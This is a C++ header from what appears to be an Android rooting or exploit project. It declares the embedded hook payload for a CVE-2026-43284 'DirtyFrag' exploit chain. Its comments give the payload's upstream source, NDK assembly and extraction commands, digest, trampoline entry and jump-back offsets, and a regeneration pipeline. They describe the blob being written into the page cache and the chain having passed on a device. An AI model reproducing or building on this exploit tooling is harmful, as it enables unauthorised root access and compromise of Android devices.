#pragma once
/** @file backend/cve_2026_43284/embed/libcxx_blob.hpp
 *  The sentry hook's payload: the upstream DirtyFrag `libcxx.S` blob, as bytes.
 *
 *  Provenance, from the tree whose 43284 chain PASSed on this device (commit 6f7ded87,
 *  src/core/backend/cve_2026_43284/embed/libcxx_blob.hpp):
 *
 *    source   upstream ankitrawatgit/DirtyFrag-Android-Root-Jailbreak, usermode/ankit/libcxx.S,
 *             commit de2ab7be69dc159af508d584523fd4d5c0b7cc7a
 *    build    NDK 30.0.16248370, from usermode/ankit/:
 *               aarch64-linux-android30-clang --target=aarch64-linux-android30 -c libcxx.S -o libcxx.o -I .
 *               llvm-objcopy -O binary --only-section=.data libcxx.o libcxx.bin
 *               (the blob is the contiguous .data image [libcxx_data, libcxx_data + libcxx_len),
 *               libcxx_len = 472, zero-padded here to 480 = the sixteen-byte block)
 *    size     472 bytes, zero-padded to 480
 *    sha256   d226d2e7883d3eba60d4e12f6707b2830c11a4a1d2e1e492d01bac6fdd245aa7 (of the 472)
 *
 *  Layout, read off the assembled symbol table (the retired tree's constants, kept because they are
 *  the blob's own layout and not a device fact): the blob stores its strings first, so the
 *  executable entry is at 0x90, the parameterised displaced-instruction word at 0x1D0, and the
 *  jump-back word at 0x1D4.
 *
 *  Regeneration of the .cpp (generated, never hand-edited):
 *    git show 6f7ded87:src/core/backend/cve_2026_43284/embed/libcxx_blob.cpp \
 *      | sed -n '/kLibcxx\[kLibcxxPaddedSize\]/,/^        };/p' \
 *      | grep -oE '0x[0-9a-fA-F]{2}U' | sed 's/0x//; s/U//' | tr -d '\n' | xxd -r -p \
 *      > /tmp/libcxx_padded.bin     # 480 bytes; head -c 472 | sha256sum must print the digest above
 */
#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43284::embed {
    /** The raw blob. */
    inline constexpr std::size_t kLibcxxSize = 472U;
    /** The blob padded to the page-cache block, which is what the write path places. */
    inline constexpr std::size_t kLibcxxPaddedSize = 480U;
    /** The executable entry inside the blob. */
    inline constexpr std::size_t kLibcxxEntryOffset = 0x90U;
    /** The parameterised word the trampoline replays. */
    inline constexpr std::size_t kLibcxxDisplacedOffset = 0x1D0U;
    /** The word that branches back into the hooked function. */
    inline constexpr std::size_t kLibcxxJumpBackOffset = 0x1D4U;
    /** The digest the bytes were verified against. */
    inline constexpr char kLibcxxSha256[] =
        "d226d2e7883d3eba60d4e12f6707b2830c11a4a1d2e1e492d01bac6fdd245aa7";

    [[nodiscard]] const std::uint8_t *libcxx_bytes() noexcept;
    [[nodiscard]] std::size_t libcxx_size() noexcept;
    [[nodiscard]] std::size_t libcxx_padded_size() noexcept;
}  // namespace ghostlock::backend::cve_2026_43284::embed
